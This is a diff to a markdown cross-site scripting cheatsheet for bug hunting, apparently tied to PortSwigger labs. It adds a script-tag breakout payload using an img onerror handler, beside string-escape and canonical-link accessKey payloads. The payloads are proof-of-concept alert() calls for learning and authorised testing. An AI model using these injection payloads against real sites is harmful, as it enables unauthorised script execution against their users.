@@ -77,7 +77,14 @@ xss';alert(1);'xss
 '-alert(1)-'
 ```
 Finally the code will look like this after response.
-![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5)
+![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5) <br>
+In some scenarios the payload might not work because of single quote and backslash escape.
+![Screenshot from 2024-07-01 04-27-49](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/af236bde-554a-45f9-8e61-77f4409e5ef4) <br>
+In this situation, you close the script tag inject your payload.
+```
+</script><img src=x onerror=alert(1337)>
+```
+
 ## Tags and Attribute Block Bypass
 ### Reflected XSS into HTML context with most tags and attributes blocked
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked. Bruteforce for getting allowed tags.
@@ -97,7 +104,7 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-cont
 ```
 ## Reflected XSS in canonical link tag
 Make your custom parameter in a url path such as httpx://a.com/?```whoami=cyborg71```.
-![Screenshot from 2024-07-01 03-55-35](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/67df34d4-e22f-49cf-a1f0-786a9113b316)
+![Screenshot from 2024-07-01 03-55-35](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/67df34d4-e22f-49cf-a1f0-786a9113b316)<br>
 After this, If we get a canonical link in page source, then there might be a xss vulnerability exists. In this case try this payloads.
 ```
 /?whoami=cyborg71'%09onclick='alert(1337)'%09accessKey='x'
